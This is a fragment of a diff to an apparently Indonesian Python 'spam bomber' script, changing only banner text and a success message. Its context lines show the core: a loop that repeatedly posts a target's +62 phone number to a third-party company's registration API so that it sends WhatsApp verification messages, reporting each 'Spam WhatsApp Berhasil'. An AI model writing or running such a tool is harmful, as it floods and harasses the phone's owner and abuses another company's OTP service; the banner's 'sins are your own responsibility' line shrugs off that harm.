@@ -32,7 +32,7 @@ mengetik(" \033[33;1m  \033[36;1m [•] Yotube  : Belum Bikin chanel            
 mengetik("\033[31;1m  ╚════════════════════════════════════════════════╝")
 print ("")
 mengetik("\033[36;1m ╔═══════════════════════════╗")
-mengetik("\033[36;1m║\033[33;1m  Gunakan Dengan Bijak \033[36;1m      ║")
+mengetik("\033[36;1m║\033[33;1m  Dosa Tanggung Sendiri \033[36;1m      ║")
 mengetik("\033[36;1m ╚═══════════════════════════╝")
 sleep(1)
 #MENU
@@ -64,6 +64,6 @@ for k in range(jumlah):
   data = json.dumps({"phone_number":"+62"+nomer,"channel":"WA"})
   pos = requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers=head,data=data).text
   if "success" in pos:
-    print("Spam WhatsApp Berhasil",k)
+    print("Spam WhatsApp Berhasil boss",k)
   else:
     print("Spam WhatsApp Gagal Ke",k)
